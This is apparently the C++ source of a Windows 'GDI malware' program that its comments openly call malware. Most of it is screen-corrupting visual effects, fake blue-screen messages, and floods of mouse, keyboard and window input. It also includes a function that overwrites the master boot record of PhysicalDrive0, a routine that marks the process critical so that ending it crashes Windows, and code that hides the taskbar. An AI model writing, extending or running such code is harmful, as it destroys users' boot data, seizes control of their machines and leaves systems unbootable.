// Pinkyblue123-o4q Is Suck.cpp : Defines the entry point for the application.
//

#include "Pinkyblue123-o4q Is Suck.h"

// flv.cpp : return?
// inspired by CriticForInterpreting's and kapi2.0peys' malwares
// originally was going to be called qcbgdwfoqm

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include <string>
#include <vector>

//#include "stuffs.h"
#include "noskidrec.h"
#define M_PI   3.14159265358979323846264338327950288
HCRYPTPROV hProv;
int Random()
{
	if (!hProv)
		CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);

	int out = 0;
	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out)); //Generate random number
	return out & 0x7FFFFFFF;
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;//Credit to malsteve for the hue function
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) {
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}
COLORREF RndRGB2() { //like RndRGB, but only red, green and blue
	int clr2 = rand() % 3;
	if (clr2 == 0) return RGB(255, 0, 0); if (clr2 == 1) return RGB(0, 255, 0); if (clr2 == 2) return RGB(0, 0, 255);
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

// Assuming this function is defined elsewhere in your project

DWORD WINAPI movecur(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	POINT curPos;

	while (1) {
		int lol = rand() % sw;
		int lol2 = rand() % sh;
		for (int y = 0; y <= 250; y++) {
			GetCursorPos(&curPos);
			SetCursorPos(lol + static_cast<int>(y * sin(y * 0.20)), lol2 + static_cast<int>(y * cos(y * 0.20)));
			Sleep(1);
		}
	}
	return 0;
}

DWORD WINAPI windowmove(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		HWND hwnd = GetForegroundWindow();
		if (hwnd && IsWindowVisible(hwnd)) {
			MoveWindow(hwnd, rand() % sw, rand() % sh, rand() % sw, rand() % sh, FALSE);
		}
		Sleep(1 + rand() % 5);
	}
	return 0;
}

DWORD WINAPI windowflash(LPVOID lpParam) {
	while (1) {
		HWND hwnd = GetForegroundWindow();
		if (hwnd && IsWindowVisible(hwnd)) {
			FlashWindow(hwnd, TRUE);
		}
		Sleep(1 + rand() % 5);
	}
	return 0;
}

DWORD WINAPI Click(LPVOID lpstart) {
	while (true) {
		INPUT input = { 0 };
		input.type = INPUT_MOUSE;
		input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		Sleep(1 + rand() % 8);
	}
	return 0;
}

std::vector<WORD> getKeyPool() {
	std::vector<WORD> keys;

	for (WORD k = 'A'; k <= 'Z'; ++k) keys.push_back(k);
	for (WORD k = '0'; k <= '9'; ++k) keys.push_back(k);
	for (WORD k = VK_F1; k <= VK_F12; ++k) keys.push_back(k);

	keys.push_back(VK_LEFT); keys.push_back(VK_RIGHT); keys.push_back(VK_UP); keys.push_back(VK_DOWN);
	keys.push_back(VK_SPACE); keys.push_back(VK_RETURN); keys.push_back(VK_TAB); keys.push_back(VK_BACK);
	keys.push_back(VK_DELETE); keys.push_back(VK_HOME); keys.push_back(VK_END);
	keys.push_back(VK_PRIOR); keys.push_back(VK_NEXT); keys.push_back(VK_INSERT); keys.push_back(VK_ESCAPE);
	keys.push_back(VK_OEM_COMMA); keys.push_back(VK_OEM_PERIOD); keys.push_back(VK_OEM_MINUS); keys.push_back(VK_OEM_PLUS);
	keys.push_back(VK_OEM_1); keys.push_back(VK_OEM_2); keys.push_back(VK_OEM_3); keys.push_back(VK_OEM_4);
	keys.push_back(VK_OEM_5); keys.push_back(VK_OEM_6); keys.push_back(VK_OEM_7);

	return keys;
}

void sendKey(WORD key) {
	INPUT ip = { 0 };
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	// Key down
	ip.ki.wVk = key;
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));

	// Key up
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
}

DWORD WINAPI keystrokes(LPVOID lpParam) {
	std::vector<WORD> keyPool = getKeyPool();
	while (1) {
		WORD key = keyPool[rand() % keyPool.size()];
		sendKey(key);
		Sleep(1);
	}
	return 0;
}

VOID WINAPI OpenRandomProgram() {
	int program = 1 + rand() % 9;
	std::string command = "";

	switch (program) {
	case 1: command = "start notepad.exe"; break;
	case 2: command = "start cmd.exe"; break;
	case 3: command = "start control.exe"; break;
	case 4: command = "start explorer.exe"; break;
	case 5: command = "start mspaint.exe"; break;
	case 6: command = "start charmap.exe"; break;
	case 7: command = "start magnify.exe"; break;
	case 8: command = "start osk.exe"; break;
	case 9: command = "start psr.exe"; break;
	}
	if (!command.empty()) {
		std::system(command.c_str());
	}
}

DWORD WINAPI openprograms(LPVOID lpParam) {
	while (1) {
		OpenRandomProgram();
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI fakecur(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	HCURSOR arrow = LoadCursor(NULL, IDC_ARROW);
	POINT curPos;

	while (1) {
		HDC hdc = GetDC(0); // Fetch Device Context
		if (hdc) {
			GetCursorPos(&curPos);
			DrawIcon(hdc, curPos.x, curPos.y, arrow);
			ReleaseDC(0, hdc); // Crucial step to stop the massive memory/GDI leak
		}
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI fakebsod(LPVOID lpParam) {
	HDC hdc, memdc;
	HBITMAP hbit;
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	double why = 0.02;

	// Create fonts outside the loop to prevent massive GDI leaks
	HFONT font = CreateFontA(35 / 1.5, 20 / 1.5, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Lucida Console");
	HFONT font2 = CreateFontA(35 / 1.5, 20 / 1.5, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Wingdings");

	LPCSTR message = "A problem has been detected and Windows has been shut down to prevent damage to your computer.";
	LPCSTR message2 = "If this is the first time you've seen this stop error screen, restart your computer.";
	LPCSTR message3 = "If this screen appears again, follow these steps:";
	LPCSTR message4 = "Disable or uninstall any anti-virus, disk defragmentation or backup utilities.";
	LPCSTR message5 = "Check your hard drive configuration, and check for any updated drivers.";
	LPCSTR message6 = "Run CHKDSK /F to Pinkyblue123-o4q needs to unblock, and then unblock Underwater Tiny Kong on YouTube.";
	LPCSTR message7 = "Technical information:";
	LPCSTR message8 = "*** STOP: 6x66666666 (0x00190203,0x86EEFB00, 0xC0000102, 0x00000000)";

	while (1) {
		hdc = GetDC(0);
		memdc = CreateCompatibleDC(hdc);
		hbit = CreateCompatibleBitmap(hdc, sw, sh);

		HBITMAP oldBmp = (HBITMAP)SelectObject(memdc, hbit);

		BitBlt(memdc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

		HBRUSH brush = CreateSolidBrush(RGB(255, 0, 0));
		HBRUSH oldBrush = (HBRUSH)SelectObject(memdc, brush);

		BitBlt(memdc, 0, 0, sw, sh, memdc, 0, 0, PATCOPY);

		SetBkMode(memdc, TRANSPARENT);
		HFONT oldFont = (HFONT)SelectObject(memdc, font);
		SetTextColor(memdc, RGB(0, 0, 0));

		// Shaking text effect using rand()
		TextOutA(memdc, 0, 20 + (3 - rand() % 6), message, strlen(message));
		TextOutA(memdc, 0, 50 + (3 - rand() % 6), message2, strlen(message2));
		TextOutA(memdc, 0, 80 + (3 - rand() % 6), message3, strlen(message3));
		TextOutA(memdc, 0, 110 + (3 - rand() % 6), message4, strlen(message4));
		TextOutA(memdc, 0, 140 + (3 - rand() % 6), message5, strlen(message5));
		TextOutA(memdc, 0, 170 + (3 - rand() % 6), message6, strlen(message6));
		TextOutA(memdc, 0, 200 + (3 - rand() % 6), message7, strlen(message7));
		TextOutA(memdc, 0, 250 + (3 - rand() % 6), message8, strlen(message8));

		BitBlt(hdc, 0, 0, sw, sh, memdc, 0, 0, SRCCOPY);

		// Cleanup loop-specific GDI elements
		SelectObject(memdc, oldBrush);
		DeleteObject(brush);

		SelectObject(memdc, oldFont);
		SelectObject(memdc, oldBmp);
		DeleteObject(hbit);
		DeleteDC(memdc);
		ReleaseDC(0, hdc);

		why++;
		Sleep(10); // Added small sleep to prevent 100% CPU usage spikes
	}

	// Clean up global thread fonts if loop ever breaks
	DeleteObject(font);
	DeleteObject(font2);
	return 0;
}

DWORD WINAPI fakebsod2(LPVOID lpParam) {
	HDC hdc, memdc;
	HBITMAP hbit;
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	double why = 0.02;

	// Allocate base font outside the loop to prevent rapid memory/GDI resource exhaustion
	HFONT font = CreateFontA(35 / 1.5, 20 / 1.5, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Lucida Console");

	// Original messages to be processed into glitch text
	char message[] = "A problem has been detected and Windows has been shut down to prevent damage to your computer.";
	char message2[] = "If this is the first time you've seen this stop error screen, restart your computer.";
	char message3[] = "If this screen appears again, follow these steps:";
	char message4[] = "Disable or uninstall any anti-virus, disk defragmentation or backup utilities.";
	char message5[] = "Check your hard drive configuration, and check for any updated drivers.";
	char message6[] = "Run CHKDSK /F to check for hard drive corruption, and then restart your computer.";
	char message7[] = "Technical information:";
	char message8[] = "*** STOP: 0x00000024 (0x00190203,0x86EEFB00, 0xC0000102, 0x00000000)";
	char message9[] = "noonnononoonononnonoonononononononoonnoonononononononononononononononono skiddddddddedededededdededededeeddeeddeeddedddeedded malwaaaaaarrrrrrrrrrrrrrreeeeee!!1!!1!1!1!1!1!!1!1!1!1!1!1!1!!1!1!1!1!1!1!!11!!";

	size_t len1 = strlen(message);
	size_t len2 = strlen(message2);
	size_t len3 = strlen(message3);
	size_t len4 = strlen(message4);
	size_t len5 = strlen(message5);
	size_t len6 = strlen(message6);
	size_t len7 = strlen(message7);
	size_t len8 = strlen(message8);
	size_t len9 = strlen(message9);

	while (1) {
		// Corrupt the text elements at random positions to achieve the "glitch word" look
		if (len1 > 0) message[rand() % len1] = (rand() % 2) ? (33 + rand() % 93) : message[rand() % len1];
		if (len2 > 0) message2[rand() % len2] = (rand() % 2) ? (33 + rand() % 93) : message2[rand() % len2];
		if (len3 > 0) message3[rand() % len3] = (rand() % 2) ? (33 + rand() % 93) : message3[rand() % len3];
		if (len4 > 0) message4[rand() % len4] = (rand() % 2) ? (33 + rand() % 93) : message4[rand() % len4];
		if (len5 > 0) message5[rand() % len5] = (rand() % 2) ? (33 + rand() % 93) : message5[rand() % len5];
		if (len6 > 0) message6[rand() % len6] = (rand() % 2) ? (33 + rand() % 93) : message6[rand() % len6];
		if (len7 > 0) message7[rand() % len7] = (rand() % 2) ? (33 + rand() % 93) : message7[rand() % len7];
		if (len8 > 0) message8[rand() % len8] = (rand() % 2) ? (33 + rand() % 93) : message8[rand() % len8];
		if (len9 > 0) message9[rand() % len9] = (rand() % 2) ? (33 + rand() % 93) : message9[rand() % len9];

		hdc = GetDC(0);
		memdc = CreateCompatibleDC(hdc);
		hbit = CreateCompatibleBitmap(hdc, sw, sh);
		HBITMAP oldBmp = (HBITMAP)SelectObject(memdc, hbit);

		BitBlt(memdc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

		// Simulating Hue-like color shifter using native Win32 RGB values
		HBRUSH brush = CreateSolidBrush(Hue(25));
		HBRUSH oldBrush = (HBRUSH)SelectObject(memdc, brush);
		BitBlt(memdc, 0, 0, sw, sh, memdc, 0, 0, PATCOPY);

		SetBkMode(memdc, TRANSPARENT);

		// Dynamically creating a violently shifting matrix font
		HFONT font2 = CreateFontA(50 - rand() % 100, 50 - rand() % 100, rand() % 3600, 0, FW_HEAVY, rand() % 2, rand() % 2, rand() % 2, SYMBOL_CHARSET, 0, 0, 0, 0, "Webdings");
		HFONT oldFont = (HFONT)SelectObject(memdc, font2);

		SetTextColor(memdc, RGB(255, 255, 255));

		// Drawing glitched main text with erratic alignment offsets
		TextOutA(memdc, (rand() % 20) - 10, 20 + (200 - rand() % 400), message, len1);
		TextOutA(memdc, (rand() % 20) - 10, 50 + (200 - rand() % 400), message2, len2);
		TextOutA(memdc, (rand() % 20) - 10, 80 + (200 - rand() % 400), message3, len3);
		TextOutA(memdc, (rand() % 20) - 10, 110 + (200 - rand() % 400), message4, len4);
		TextOutA(memdc, (rand() % 20) - 10, 140 + (200 - rand() % 400), message5, len5);
		TextOutA(memdc, (rand() % 20) - 10, 170 + (200 - rand() % 400), message6, len6);
		TextOutA(memdc, (rand() % 20) - 10, 200 + (200 - rand() % 400), message7, len7);
		TextOutA(memdc, (rand() % 20) - 10, 250 + (200 - rand() % 400), message8, len8);

		// Clean dynamic glitch font context
		SelectObject(memdc, oldFont);
		DeleteObject(font2);

		// Return to standard interface font for background corruption wall
		SelectObject(memdc, font);

		// Render background glitch string rows across randomized vertical positions
		SetTextColor(memdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(memdc, sw - rand() % (sw * 2), rand() % sh, message9, len9);

		SetTextColor(memdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(memdc, sw - rand() % (sw * 2), rand() % sh, message9, len9);

		SetTextColor(memdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(memdc, sw - rand() % (sw * 2), rand() % sh, message9, len9);

		SetTextColor(memdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(memdc, sw - rand() % (sw * 2), rand() % sh, message9, len9);

		// Paint completed processing block to physical layer
		BitBlt(hdc, 0, 0, sw, sh, memdc, 0, 0, SRCCOPY);

		// Clean up memory block references safely to ensure smooth performance on Windows 7
		SelectObject(memdc, oldBrush);
		DeleteObject(brush);
		SelectObject(memdc, oldBmp);
		DeleteObject(hbit);
		DeleteDC(memdc);
		ReleaseDC(0, hdc);

		why++;
		Sleep(10); // Prevents thread execution from utilizing 100% CPU thread cycles
	}

	DeleteObject(font);
	return 0;
}

DWORD WINAPI shader666(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader1(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		HBRUSH hbr = CreateHatchBrush(rand() % 7, Hue(3));
		SelectObject(dcCopy, hbr);
		BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, PATCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		DeleteObject(hbr);
		ReleaseDC(0, hdc);
		//if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd) //credits to fr4ctalz, but i modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (x - y + ((i * 3) * sinf((x & y | x ^ y + i) / 500.f / (1 + (i / 2)))));
				int fx2 = (x + y + ((i * 3) * cosf((x ^ y | x + y + i & 5) / 750.f / (2 + (i / 2)))));
				int fx3 = (x + y + ((i * 3) * tanf((x & y | x ^ y + i & 10) / 1000.f / (3 + (i / 2)))));

				rgbquadCopy = rgbquad[index];
				rgbquad[index].rgbRed += (fx + 16);
				rgbquad[index].rgbGreen += cbrt(fx2 + 32);
				rgbquad[index].rgbBlue += sqrt(fx3 + 64);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI beasstballli(LPVOID lpvd)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCWSTR lpText = L"noskid";
	while (1)
	{
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetTextColor(hdc, RGB(rand() % 2, rand() % 2, rand() % 2));
		SetBkColor(hdc, RGB(255, 0, 0));
		TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}
		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}
		if (y == 0)
		{
			signY = 1;
		}
		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader3(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	HDC hdc, hdcMem;
	HBITMAP hbm;
	for (int i = 0;; i++, i %= 3)
	{
		hdc = GetDC(0);
		hdcMem = CreateCompatibleDC(hdc);
		hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++)
		{
			int v = 2 + rand() % 15;
			((BYTE*)(data + i))[2] = ((BYTE*)(data + i + v + 22))[2] + 6.1;
			((BYTE*)(data + i))[1] = ((BYTE*)(data + i + v + 22))[1] + 7.6;
			((BYTE*)(data + i))[4] = ((BYTE*)(data + i + v + 22))[4] + 9.2;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}

DWORD WINAPI iconni(LPVOID lpParam) {
	HDC hdc = GetWindowDC(GetDesktopWindow());
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		hdc = GetWindowDC(GetDesktopWindow());
		x = GetSystemMetrics(SM_CXSCREEN);
		y = GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON3)));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON3)));
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) { //credits to N17Pro3426, but I modified it
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 17.4f; double angle = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		//if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 2 + rand() % 30;
			rgb ^= (int)data + (x * y);
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}

